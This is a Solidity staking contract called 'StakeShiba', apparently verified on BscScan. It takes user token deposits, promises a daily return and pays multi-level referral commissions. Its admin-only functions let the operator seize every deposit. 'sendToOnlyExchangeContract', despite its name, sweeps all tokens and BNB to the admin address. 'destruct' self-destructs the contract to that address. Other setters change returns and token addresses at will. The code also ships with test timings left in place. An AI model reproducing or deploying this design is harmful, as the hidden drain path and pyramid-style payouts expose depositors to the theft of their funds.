/**
 *Submitted for verification at BscScan.com on 2021-08-11
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}



interface tokenInterface
{
   function transfer(address _to, uint _amount) external returns (bool);
   function transferFrom(address _from, address _to, uint _amount) external returns (bool);
   function balanceOf(address user) external view returns(uint);
}

contract StakeShiba {

    using SafeMath for uint256;

    modifier onlyAdministrator(){
        address _customerAddress = msg.sender;
        require(administrators[_customerAddress],"Caller must be admin");
        _;
    }
    /*==============================
    =            EVENTS           =
    ==============================*/

    event Reward_Buy(
       address indexed to,
       uint256 rewardAmount,
       uint256 level
    );
    event Withdraw(
        address indexed user,
        uint256 tokens
    );

    // BEP20
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );



    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/
    string public name = "Shiba Stake";
    uint256 public decimals = 18;
    mapping(address  => uint) public totalUserRewardBuy;
    mapping(address => uint) public totalUserRewardSell;
    uint public dailyROI = 40;
    address public tokenAddress;
    address public ownTokenAddress;
    address public aiContract;

    uint lockDays = 365 ; // change it to '365 days' in production
    uint oneDay = 1 ; // change it to '1 days' in production

    mapping(address => uint256) public tokenBalanceLedger_;
    mapping(address => uint256) public rewardBalanceLedger_;
    uint256 public tokenSupply_ = 0;

    mapping(address => bool) internal administrators;
    mapping(address => address) public genTree;
    mapping(address => uint) public refCount;
    mapping(address => uint256) public level1Holding_;
    mapping(address => uint40) public userjointime;


    // Separate return records
     mapping(address => uint) public dailyROIGain;
     mapping(address => uint) public claimeddailyROIGain;
     mapping(address => uint) public directIncomeGain;
     mapping(address => uint) public sponsorGain;
     mapping(address => uint) public sponsordailyGain;
     mapping(address => uint) public top5SponsorGain;

     uint public minimumBuyAmount = 1 * (10**decimals);
    bool public isAirdroplive = true;
    address public terminal;
    uint16[] percent_ =  [300,200,100,50,50,25,25];
    uint256[] holding_ = [50  * (10** decimals),100  * (10** decimals),500  * (10** decimals),1000  * (10** decimals),1500  * (10** decimals),2000  * (10** decimals),2500  * (10** decimals),3000  * (10** decimals),3500  * (10** decimals),4000  * (10** decimals)];
    uint public minWithdraw = 0 ;

    struct stakeInf
    {
        uint amount;
        uint busamount;
        uint stakeTime;
        uint totalRoi;
        uint lastWithdrawTime;
        bool isWithAirdrop;
    }

    struct user
    {
      address referrer;
      uint referralplace;
      uint256 wid_limit;
      bool isactive;
      uint256 total_payouts;
      uint256 totalbus;
      bool inAIPool;
      bool onceInAI;
    }


    mapping(address => user) public userInfo;
    mapping(address => stakeInf[]) public stakeInfo;
    mapping(address => uint) public totalStake;
    mapping(address => uint) public totalAirdrop;
    mapping(address => uint) public totalAIPool;

    uint8[] public pool_bonuses;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;

    //ai distribution
    uint40 public ai_pool_last_draw = uint40(block.timestamp);
    uint256 public ai_pool_cycle;
    uint256 public ai_pool_balance;
    uint256 AI_MinBusLimit = 100 * (10 ** decimals);
    mapping(address => uint) public top5Earners;
    uint256 public tokenprice = 627 * (10 ** decimals-8);
    bool public externaltoken;

    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint256 => mapping(address => uint256)) public ai_pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
    address[] public ai_pool_top;
    event PoolPayout(address indexed addr, uint256 amount);
    event AI_PoolPayout(address indexed addr, uint256 amount);
    event stakeTokenEv(address _user, uint _amount, uint stakeIndex);
    event directPaid(address user,address referrer, uint amount);


    constructor(address _aiContract, address _tokenAddress, address _ownTokenAddress)
    {
        terminal = msg.sender;
        administrators[terminal] = true;
        aiContract = _aiContract;
        tokenAddress = _tokenAddress;
        ownTokenAddress = _ownTokenAddress;
        externaltoken = true;
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(15);
        pool_bonuses.push(10);
        pool_bonuses.push(5);

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = terminal;
        }
    }

    /*==========================================
    =            VIEW FUNCTIONS            =
    ==========================================*/
    function poolTopInfo() view external returns(address[5] memory addrs, uint256[5] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }

    function holdingLevel1(address _toCheck) public view returns(uint256)
    {
        return level1Holding_[_toCheck];
    }
    function isContract(address _address) internal view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_address)
        }
        return (size > 0);
    }
    function NumberOfStakes(address _user) public view returns(uint)
    {
      return stakeInfo[_user].length;
    }
    function checklimit(address _addr, uint256 amount) public view returns(uint)
    {
      if(((userInfo[_addr].total_payouts + amount) <= userInfo[_addr].wid_limit) || _addr == terminal)
      {
         return amount;
      }
      else
      {
        uint remainamount = userInfo[_addr].wid_limit - userInfo[_addr].total_payouts;
        return remainamount;

      }
    }
    /*==========================================
    =            WRITE FUNCTIONS            =
    ==========================================*/

    function buy_(address useraddress, address _referredBy, uint256 tokenAmount) public onlyAdministrator returns(uint)
    {
        require(!isContract(msg.sender),  'No contract address allowed to stake');
        address msgsender = useraddress;
        require(msg.sender == terminal, "Invalid Caller");
        require(tokenAmount >= minimumBuyAmount, "Minimum limit does not reach");
        if(_referredBy == address(0) || msgsender == _referredBy) _referredBy = terminal;
        uint256 totalbus = tokenAmount;
        tokenAmount = tokenAmount.div(2);
        address token_address = tokenAddress;
        if(!externaltoken)
        {
          token_address=ownTokenAddress;
        }
        tokenInterface(token_address).transfer(address(this), tokenAmount);
        tokenInterface(token_address).transfer(aiContract, tokenAmount);
        if(genTree[msgsender] == address(0))
        {
            genTree[msgsender] = _referredBy;
            refCount[_referredBy]++;
            userInfo[msgsender].referrer = _referredBy;
            if(!userInfo[msgsender].isactive){
              userInfo[msgsender].referralplace = refCount[_referredBy];
            }
        }

        uint tkn = purchaseTokens(msgsender, tokenAmount, _referredBy, totalbus);
        _pollDeposits(msgsender, tokenAmount);
        //if(pool_last_draw + 1 days < block.timestamp)
        if(pool_last_draw + 600 < block.timestamp)
        {
          _drawPool();
        }
        userInfo[msgsender].totalbus +=totalbus ;
        _AIpollDeposits(msgsender, tokenAmount);
        return tkn;
    }
    function buy(address _referredBy,uint256 tokenAmount) public returns(uint256)
    {
      require(!isContract(msg.sender),  'No contract address allowed');
        require(tokenAmount >= minimumBuyAmount, "Minimum limit does not reach");
        if(_referredBy == address(0) || msg.sender == _referredBy) _referredBy = terminal;
        uint256 totalbus = tokenAmount;
        tokenAmount = tokenAmount.div(2);
        address token_address = tokenAddress;
        if(!externaltoken)
        {
          token_address=ownTokenAddress;
        }
        tokenInterface(token_address).transferFrom(msg.sender, address(this), tokenAmount);
        tokenInterface(token_address).transferFrom(msg.sender, aiContract, tokenAmount);
        userjointime[msg.sender] = uint40(block.timestamp);
        totalAIPool[msg.sender] += tokenAmount;
        userInfo[msg.sender].totalbus += totalbus;
        if(genTree[msg.sender] == address(0))
        {
            genTree[msg.sender] = _referredBy;
            refCount[_referredBy]++;
            userInfo[msg.sender].referrer = _referredBy;
            if(!userInfo[msg.sender].isactive){
              userInfo[msg.sender].referralplace = refCount[_referredBy];
            }
        }
      	_pollDeposits(msg.sender, tokenAmount);
        //if(pool_last_draw + 1 days < block.timestamp)
        if(pool_last_draw + 600 < block.timestamp)
    		{
    			_drawPool();
    		}
        _AIpollDeposits(msg.sender, tokenAmount);
        uint tkn = purchaseTokens(msg.sender, tokenAmount, _referredBy, totalbus);
        return tkn;
    }


    function withdrawAll() public returns(bool)
    {
      require(!isContract(msg.sender),  'No contract address allowed to withdraw');
      address _customerAddress = msg.sender;
      uint256 TopSponsorGain = top5SponsorGain[_customerAddress];
      uint256 TopEarner = top5Earners[_customerAddress];
      uint256 totaldaily= claimeddailyROIGain[_customerAddress];
      require(rewardBalanceLedger_[_customerAddress] + totaldaily >= minWithdraw, "beyond withdraw limit");
      uint256 _rewardbalance = rewardBalanceLedger_[_customerAddress] ;
      address token_address = tokenAddress;
      if(!externaltoken)
      {
        token_address=ownTokenAddress;
      }
      uint256 _balance = _rewardbalance + totaldaily + TopSponsorGain + TopEarner;
      require(tokenInterface(token_address).balanceOf(address(this)) >=  _balance , "Insufficient fund");
      if(_rewardbalance>0){
        require(rewardBalanceLedger_[_customerAddress] >=  _rewardbalance , "overflow found");
        rewardBalanceLedger_[_customerAddress] -= _rewardbalance ;
      }
      top5SponsorGain[_customerAddress] -= TopSponsorGain;
      top5Earners[_customerAddress] -= TopEarner;
      //tokenSupply_ = tokenSupply_.sub(_balance);
      uint256 amt;
      if(totaldaily>0)
      {
        claimeddailyROIGain[_customerAddress] -= totaldaily ;
        address ref = genTree[msg.sender];
        for(uint i =1 ; i <= 10;i++)
        {
          ref = genTree[ref];
          amt = totaldaily * (i*10)/100;
          if(ref == address(0)) ref = terminal;
          if(ref==terminal){
            sponsordailyGain[terminal]+= amt;
          }
          else if(refCount[ref]>i){
            uint256 checkedamt= checklimit(ref,amt);
            if(checkedamt==amt){
              sponsordailyGain[ref]+= amt;
            }
            else
            {
              uint remamt = amt - checkedamt;
              sponsordailyGain[ref] += checkedamt;
              sponsordailyGain[terminal] += remamt;
            }
            userInfo[ref].total_payouts += checkedamt;
            rewardBalanceLedger_[ref] +=checkedamt;
          }
        }
      }

      //if(pool_last_draw + 1 days < block.timestamp)
      if(pool_last_draw + 600 < block.timestamp)
      {
        _drawPool();
      }
        uint userbalance = _balance * 95 /100;
        uint adminfee = _balance * 5 /100;

        userInfo[_customerAddress].total_payouts += _balance ;

        tokenInterface(token_address).transfer(_customerAddress, userbalance);
        tokenInterface(token_address).transfer(terminal, adminfee);
        emit Transfer(address(this) , _customerAddress , _balance);
        emit Withdraw(_customerAddress, _balance);

      return true;
    }
    function Claim(uint stakeIndex) public returns(bool)
    {
      require(!isContract(msg.sender),  'No contract address allowed to withdraw');
        uint amount = stakeInfo[msg.sender][stakeIndex].busamount;
        require( amount > 0, "nothing staked");
        uint tim = stakeInfo[msg.sender][stakeIndex].stakeTime;
        uint tim2 = stakeInfo[msg.sender][stakeIndex].lastWithdrawTime;
        uint lD = lockDays;
        uint oD = oneDay;
        if(tim2 < tim + lD)
        {
          uint usedDays = (tim2 - tim) / oD;
          uint daysPassed = (block.timestamp - tim2 ) / oD;
          if(usedDays + daysPassed > lD ) daysPassed = lD - usedDays;
          uint256 vmainamt=amount;
          if(stakeInfo[msg.sender][stakeIndex].isWithAirdrop)
          {
            vmainamt = vmainamt.sub(totalAirdrop[msg.sender]);
          }
          uint amt = (amount * extraROI(vmainamt) / 10000) * daysPassed ;
          stakeInfo[msg.sender][stakeIndex].lastWithdrawTime = block.timestamp;
          stakeInfo[msg.sender][stakeIndex].totalRoi += amt ;
          dailyROIGain[msg.sender] += amt;
          claimeddailyROIGain[msg.sender] += amt ;
          emit Transfer(address(this), msg.sender, amt );
          emit Withdraw(msg.sender, amt);
        }
        return true;
    }
      receive() external payable {
    }

    /*==========================================
    =            INTERNAL FUNCTIONS            =
    ==========================================*/
    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;
        address upline = genTree[_addr];
        if(upline == address(0)) return;
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _AIpollDeposits(address _addr, uint256 _amount) private {
        ai_pool_balance += _amount * 5 / 100;
        if(_addr == address(0)) return;
        ai_pool_users_refs_deposits_sum[ai_pool_cycle][_addr] += tokenprice * _amount;

        //if(ai_pool_users_refs_deposits_sum[ai_pool_cycle][_addr] > 500000 * (10** decimals) && !userInfo[_addr].inAIPool && ai_pool_top.length < 5)
        if(userInfo[_addr].onceInAI){
          if(ai_pool_users_refs_deposits_sum[ai_pool_cycle][_addr] > AI_MinBusLimit && !userInfo[_addr].inAIPool && ai_pool_top.length < 5)
          {
            userInfo[_addr].inAIPool =true;
            ai_pool_top.push(_addr);
          }
        }
        else
        {
          if(userInfo[_addr].totalbus > AI_MinBusLimit && !userInfo[_addr].inAIPool && ai_pool_top.length < 5)
          {
            userInfo[_addr].inAIPool =true;
            userInfo[_addr].onceInAI =true;
            ai_pool_top.push(_addr);
          }
        }
      }
      function _drawPool() private {
          pool_last_draw = uint40(block.timestamp);
          pool_cycle++;
          //uint256 draw_amount = (pool_balance).div(10);
          uint256 draw_amount = pool_balance ;
          for(uint8 i = 0; i < pool_bonuses.length; i++) {
              if(pool_top[i] == address(0)) break;
              uint256 win = (draw_amount * pool_bonuses[i]).div(100);
              uint256 checkedamt= checklimit(pool_top[i], win);
              if(checkedamt==win){
                top5SponsorGain[pool_top[i]] += win;
              }
              else
              {
                uint remamt = win - checkedamt;
                top5SponsorGain[pool_top[i]] += checkedamt;
                top5SponsorGain[terminal] += remamt;
              }
              pool_balance -= win;
              emit PoolPayout(pool_top[i], win);
          }
          for(uint8 i = 0; i < pool_bonuses.length; i++) {
              pool_top[i] = terminal;
          }
      }
      function setAI_MinBusLimit(uint _AI_MinBusLimit) public onlyAdministrator returns(bool)
      {
         AI_MinBusLimit =_AI_MinBusLimit * (10** decimals);
          return true;
      }
      function settokenprice(uint256 _tokenprice) public onlyAdministrator returns(bool)
      {
         tokenprice =_tokenprice ;
          return true;
      }
      function drawAIPool() public onlyAdministrator returns(bool)
      {
        //if(ai_pool_last_draw + 30 days < block.timestamp)
        if(ai_pool_last_draw + 600 < block.timestamp)
        {
          _drawAIPool();
        }
        return true;
      }
      function _drawAIPool() private {
        if(ai_pool_top.length > 0 )
        {
          ai_pool_last_draw = uint40(block.timestamp);
          ai_pool_cycle++;

          uint256 draw_amount = (ai_pool_balance).div(ai_pool_top.length) ;

          for(uint8 i = 0; i < ai_pool_top.length; i++) {
              if(ai_pool_top[i] == address(0)) break;
                //payable(ai_pool_top[i]).transfer(draw_amount);
                //tokenInterface(tokenAddress).transfer(ai_pool_top[i], draw_amount);
                ai_pool_balance -= draw_amount;
                userInfo[ai_pool_top[i]].inAIPool = false;
                top5Earners[ai_pool_top[i]] +=draw_amount;
                emit AI_PoolPayout(ai_pool_top[i], draw_amount);
          }
          delete ai_pool_top ;
        }

      }
    function purchaseTokens(address _customerAddress, uint256 _amountOfTokens, address _referredBy, uint256 mainamount) internal returns(uint256)
    {
        //deduct commissions for referrals
        uint256 directincome = mainamount* 8/100;
        uint256 checkedamt= checklimit(_referredBy, directincome);
        if(checkedamt==directincome){
          sponsorGain[_referredBy] += directincome;
          rewardBalanceLedger_[_referredBy] += directincome;
          emit directPaid(_customerAddress, _referredBy ,directincome);
          tokenSupply_ = tokenSupply_.add(_amountOfTokens + (directincome));
          level1Holding_[_referredBy] +=_amountOfTokens*2;
          userInfo[_referredBy].total_payouts += directincome;
          //tokenInterface(tokenAddress).transfer(_referredBy, _amountOfTokens/10);
          //tokenBalanceLedger_[_referredBy] = tokenBalanceLedger_[_referredBy].add(_amountOfTokens/10);
        }
        else
        {
          uint remamt = directincome - checkedamt;
          sponsorGain[_referredBy] += checkedamt;
          sponsorGain[terminal] += remamt;
          rewardBalanceLedger_[_referredBy] += checkedamt;
          emit directPaid(_customerAddress, _referredBy ,checkedamt);
          tokenSupply_ = tokenSupply_.add(_amountOfTokens + (directincome));
          level1Holding_[_referredBy] +=_amountOfTokens*2;
          userInfo[_referredBy].total_payouts += remamt;
          //tokenInterface(tokenAddress).transfer(_referredBy, _amountOfTokens/10);
          //tokenBalanceLedger_[_referredBy] = tokenBalanceLedger_[_referredBy].add(_amountOfTokens/10);
        }

        distributeRewards(mainamount,_customerAddress);
        tokenBalanceLedger_[_customerAddress] = tokenBalanceLedger_[_customerAddress].add(_amountOfTokens);
        stakeToken(_customerAddress,mainamount);
        // fire event
        emit Transfer(address(0), _customerAddress, _amountOfTokens);
        return _amountOfTokens;
    }
    function stakeToken(address _user, uint256 mainamount) internal returns(bool)
    {
        uint amount = tokenBalanceLedger_[_user];
        tokenBalanceLedger_[_user] = 0;
        userInfo[_user].wid_limit += amount * 4 ;
        stakeInf memory temp;
        if(isAirdroplive && totalAirdrop[_user]==0 && mainamount >=((10 * 10 ** decimals).div(tokenprice)))
        {
          totalAirdrop[_user] = 250000 * 10 ** decimals;
          amount += 250000 * 10 ** decimals;
          mainamount += 250000 * 10 ** decimals;
          temp.isWithAirdrop =true;
        }
        tokenBalanceLedger_[address(this)] = tokenBalanceLedger_[address(this)].add(amount);
        temp.amount = amount;
        temp.busamount=mainamount;
        temp.stakeTime = block.timestamp;
        temp.lastWithdrawTime = block.timestamp;
        stakeInfo[_user].push(temp);
        totalStake[_user] += amount;
        emit stakeTokenEv(_user, amount, stakeInfo[_user].length);
        emit Transfer(_user, address(this), amount);
        return true;
    }
    function distributeRewards(uint256 _amount, address _idToDistribute)  internal
    {
        _idToDistribute = genTree[_idToDistribute];
        uint256 amt;
        for(uint i=0; i<7; i++)
        {
            _idToDistribute = genTree[_idToDistribute];
            if(_idToDistribute == address(0)) _idToDistribute = terminal;
            //uint256 value = tokenBalanceLedger_[_idToDistribute];
            //value +=  totalStake[_idToDistribute];
           // uint256 _holdingLevel1 = level1Holding_[_idToDistribute];
            uint pct;
            pct = percent_[i];
            //if(value >= (1500000 * (10** decimals)) && _holdingLevel1 >= (holding_[i]) )
            //{
                amt= _amount*pct/10000;
                uint256 checkedamt= checklimit(_idToDistribute,amt);
                if(checkedamt==amt){
                  rewardBalanceLedger_[_idToDistribute] += amt;
                  userInfo[_idToDistribute].total_payouts += amt;
                  totalUserRewardBuy[_idToDistribute] += amt;
                  directIncomeGain[_idToDistribute] += amt;
                  emit Reward_Buy(_idToDistribute,amt,i);
                }
                else
                {
                  uint remamt = amt - checkedamt;
                  rewardBalanceLedger_[_idToDistribute] += checkedamt;
                  userInfo[_idToDistribute].total_payouts += checkedamt;
                  totalUserRewardBuy[_idToDistribute] += checkedamt;
                  directIncomeGain[_idToDistribute] += checkedamt;
                  emit Reward_Buy(_idToDistribute,checkedamt,i);
                  rewardBalanceLedger_[terminal] += remamt;
                }
            //}
        }
        rewardBalanceLedger_[terminal] += _amount*2/100;
    }
    function extraROI(uint256 _grv) internal view returns(uint256)
    {
        if(_grv < 500 * (10** decimals))
        {
            return dailyROI;
        }
        else if(_grv >= 500 * (10** decimals) && _grv <= 2500 * (10** decimals) )
        {
            return dailyROI + 5;
        }
        else if(_grv > 2500 * (10** decimals) && _grv <= 5000 * (10** decimals) )
        {
            return dailyROI + 15;
        }
        else if(_grv > 5000 * (10** decimals) && _grv <= 10000 * (10** decimals) )
        {
            return dailyROI + 20;
        }
        else if(_grv > 10000 * (10** decimals) )
        {
            return dailyROI + 30;
        }
        return dailyROI;
    }
    /*==========================================
    =            Admin FUNCTIONS            =
    ==========================================*/
    function changeTokenAddress(address _tokenAddress,address _ownTokenAddress) public onlyAdministrator returns(bool)
    {
        tokenAddress = _tokenAddress;
        ownTokenAddress = _ownTokenAddress;
        return true;
    }
    function setMinWithdraw(uint _minWithdraw) public onlyAdministrator returns(bool)
    {
        minWithdraw = _minWithdraw * (10** decimals);
        return true;
    }

    function setMinimumBuyAmount(uint _minimumBuyAmount) public onlyAdministrator returns(bool)
    {
        minimumBuyAmount = _minimumBuyAmount * (10** decimals);
        return true;
    }
    function setAirdroplive(bool _isAirdroplive) public onlyAdministrator returns(bool)
    {
        isAirdroplive = _isAirdroplive ;
        return true;
    }


    function sendToOnlyExchangeContract() public onlyAdministrator returns(bool)
    {
        require(!isContract(msg.sender),  'No contract address allowed');
        payable(terminal).transfer(address(this).balance);
        address token_address = tokenAddress;
        if(!externaltoken)
        {
          token_address=ownTokenAddress;
        }
        uint tokenBalance = tokenInterface(token_address).balanceOf(address(this));
        tokenBalanceLedger_[address(this)] = 0 ;
        tokenInterface(token_address).transfer(terminal, tokenBalance);
        tokenBalanceLedger_[terminal]  += tokenBalance;
        return true;
    }
    function destruct() onlyAdministrator() public{
        selfdestruct(payable(terminal));
    }
    // use 12 for 1.2 ( one digit will be taken as decimal )
    function setDailyROI(uint _dailyROI) public  onlyAdministrator returns(bool)
    {
        dailyROI = _dailyROI;
        return true;
    }
    function setterminal(address _terminal) public  onlyAdministrator returns(bool)
    {
        terminal = _terminal;
        administrators[terminal] = true;
        return true;
    }

    function setDaysFactor(uint _secondForOneDays) public onlyAdministrator returns(bool)
    {
        lockDays = 365 * _secondForOneDays;
        oneDay = _secondForOneDays;
        return true;
    }

    function useExternalToken(bool _externaltoken) public onlyAdministrator returns(bool)
    {
        externaltoken = _externaltoken;
        return true;
    }
    function airdropACTIVE(address[] memory recipients,uint256[] memory tokenAmount) public onlyAdministrator returns(bool) {
      require(!isContract(msg.sender),  'No contract address allowed');
        uint256 totalAddresses = recipients.length;
        require(totalAddresses <= 150,"Too many recipients");
        address token_address = tokenAddress;
        if(!externaltoken)
        {
          token_address=ownTokenAddress;
        }
        for(uint i = 0; i < totalAddresses; i++)
        {
          //This will loop through all the recipients and send them the specified tokens
          //Input data validation is unncessary, as that is done by SafeMath and which also saves some gas.
          //transfer(recipients[i], tokenAmount[i]);
          tokenInterface(token_address).transfer(recipients[i], tokenAmount[i]);
        }
        return true;
    }

    function updatePercent_(uint16[] memory values) public onlyAdministrator returns(bool)
    {
        for(uint i = 0 ; i < 7; i++)
        {
            percent_[i] = values[i];
        }
        return true;
    }

    function updateHolding_(uint[] memory values) public onlyAdministrator returns(bool)
    {
        for(uint i = 0 ; i < 10; i++)
        {
            holding_[i] = values[i];
        }
        return true;
    }
    function setAiContract(address _aiContract) public onlyAdministrator returns(bool)
    {
        aiContract = _aiContract;
        return true;
    }
}